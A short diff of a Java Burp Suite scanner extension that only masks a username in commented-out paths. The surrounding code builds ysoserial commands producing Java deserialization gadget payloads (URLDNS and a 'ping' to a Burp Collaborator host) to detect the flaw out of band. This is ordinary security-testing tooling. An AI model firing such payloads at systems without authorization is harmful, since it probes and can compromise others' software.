@@ -441,7 +441,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab
 		 				{
 		 					if(commands.get(i).equalsIgnoreCase("URLDNS"))
 		 					{
-		 						//String cmd = "java -jar C:\\Users\\ALUKO01\\Desktop\\ysoserial-master-v0.0.5-gb617b7b-16.jar "+commands.get(i)+" "+"\""+"http://"+burpcollab+"\"";
+		 						//String cmd = "java -jar C:\\Users\\xxxxx\\Desktop\\ysoserial-master-v0.0.5-gb617b7b-16.jar "+commands.get(i)+" "+"\""+"http://"+burpcollab+"\"";
 		 						String cmd = "java -jar ysoserial-master-v0.0.5.jar "+commands.get(i)+" "+"\""+"http://"+burpcollab+"\"";
 		 						execute("URLDNS",cmd);
 		 					}
@@ -457,7 +457,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab
 		 					}
 		 					else
 		 					{
-		 						//String cmd = "java -jar C:\\Users\\ALUKO01\\Desktop\\ysoserial-master-v0.0.5-gb617b7b-16.jar "+commands.get(i)+" "+"\""+"ping "+burpcollab+"\"";
+		 						//String cmd = "java -jar C:\\Users\\xxxx\\Desktop\\ysoserial-master-v0.0.5-gb617b7b-16.jar "+commands.get(i)+" "+"\""+"ping "+burpcollab+"\"";
 		 						String cmd = "java -jar ysoserial-master-v0.0.5.jar "+commands.get(i)+" "+"\""+"ping "+burpcollab+"\"";
 		 						execute(commands.get(i),cmd);
 		 					}
